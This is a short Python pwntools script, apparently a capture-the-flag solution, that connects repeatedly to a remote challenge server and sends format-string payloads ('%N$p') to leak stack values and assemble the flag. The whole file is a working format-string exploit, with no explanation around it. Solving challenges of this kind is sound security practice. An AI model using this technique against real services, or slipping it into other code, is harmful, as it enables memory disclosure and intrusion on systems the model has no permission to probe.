from pwn import *

flag=b""

for i in range(0,100):
	p = remote("challs.n00bzunit3d.xyz",7150)
	payload = "%"+str(i)+"$"+"p"
	p.sendline(payload.encode())
	p.recvuntil(b"Do you love strings? \n")
	#print(i,p.recvuntil(b"\n"))
	flag+=p.recvuntil(b"\n")
	p.close()

print(flag)
